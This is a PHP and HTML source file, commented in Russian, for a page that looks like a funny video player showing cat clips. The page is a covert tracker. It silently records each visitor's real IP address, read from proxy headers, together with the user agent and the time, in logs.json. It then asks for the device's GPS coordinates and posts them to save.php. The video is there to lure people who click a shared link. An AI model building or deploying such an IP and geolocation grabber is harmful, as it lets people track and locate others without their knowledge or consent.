<?php
// index.php
session_start();

// Установка временной зоны Узбекистана (Ташкент) для точной фиксации кликов
date_default_timezone_set('Asia/Tashkent');

// Функция продвинутого определения реального IP пользователя в обход прокси-серверов
function getRealIP() {
    $ip_keys = ['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($ip_keys as $key) {
        if (!empty($_SERVER[$key])) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                // Валидация публичного IP-адреса
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
            // Если публичный IP не найден, но передан валидный локальный IP
            if (filter_var($_SERVER[$key], FILTER_VALIDATE_IP) !== false) {
                return $_SERVER[$key];
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Не определен';
}

$ip = getRealIP();
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Не определен';
$request_time = date('Y-m-d H:i:s'); // Время фиксируется по Ташкенту
$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
$port = $_SERVER['REMOTE_PORT'] ?? '';

/* 
  Массив с прямыми ссылками на юмористические MP4 видеофайлы.
  Эти файлы воспроизводятся стандартным плеером HTML5 и никогда не выдадут ошибку YouTube.
*/
$videos = [
    'https://www.w3schools.com/html/mov_bbb.mp4', // Забавный мультик (Идеально для тестов)
    'https://assets.mixkit.co/videos/preview/mixkit-funny-cat-focused-on-a-toy-41852-large.mp4', // Смешной кот
    'https://assets.mixkit.co/videos/preview/mixkit-playful-cat-lying-on-a-carpet-41849-large.mp4' // Еще один мемный кот
];

// Случайный выбор видео из списка для каждого нового посетителя
$random_video = $videos[array_rand($videos)];

// Структура записи для хранения в базе данных логов
$log_entry = [
    'id' => uniqid(),
    'time' => $request_time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'protocol' => $protocol,
    'port' => $port,
    'lat' => 'Доступ отклонен или ожидается',
    'lon' => 'Доступ отклонен или ожидается'
];

// Сохраняем ID текущей сессии для связки с AJAX-обработчиком координат
$_SESSION['current_log_id'] = $log_entry['id'];

// Запись первичных данных в файл logs.json
$file = 'logs.json';
$current_data = file_exists($file) ? json_decode(file_get_contents($file), true) : [];
if (!is_array($current_data)) $current_data = [];
$current_data[$log_entry['id']] = $log_entry;
file_put_contents($file, json_encode($current_data, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
?>
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Воспроизведение...</title>
    <style>
        /* Стили для создания абсолютно полноэкранного плеера под мобильные телефоны */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            position: relative;
        }
        .fullscreen-video {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover; /* Растягивает видео на весь экран телефона без рамок */
            z-index: 1;
        }
        /* Прозрачная невидимая кнопка на весь экран для активации звука/видео при первом тапе */
        .mobile-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            cursor: pointer;
            background: rgba(0,0,0,0.01);
        }
    </style>
</head>
<body>

<div class="mobile-overlay" id="overlay"></div>

<!-- HTML5-видеоплеер. Параметр playsinline критически важен для iPhone -->
<video id="myVideo" class="fullscreen-video" autoplay muted loop playsinline controls>
    <source src="<?php echo htmlspecialchars($random_video); ?>" type="video/mp4">
    Ваш браузер не поддерживает встроенный плеер.
</video>

<script>
// Снятие блокировки звука и автозапуска Apple/Android при первом клике по экрану
document.getElementById('overlay').addEventListener('click', function() {
    const video = document.getElementById('myVideo');
    video.muted = false; // Включаем звук
    video.play();
    this.style.display = 'none'; // Убираем невидимую кнопку
});

// Запрос координат устройства средствами браузера
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
        const data = new FormData();
        data.append('lat', position.coords.latitude);
        data.append('lon', position.coords.longitude);

        // Отправка полученных координат в save.php
        fetch('save.php', {
            method: 'POST',
            body: data
        });
    }, function(error) {
        console.log("Доступ к геопозиции не предоставлен устройством.");
    });
}
</script>
</body>
</html>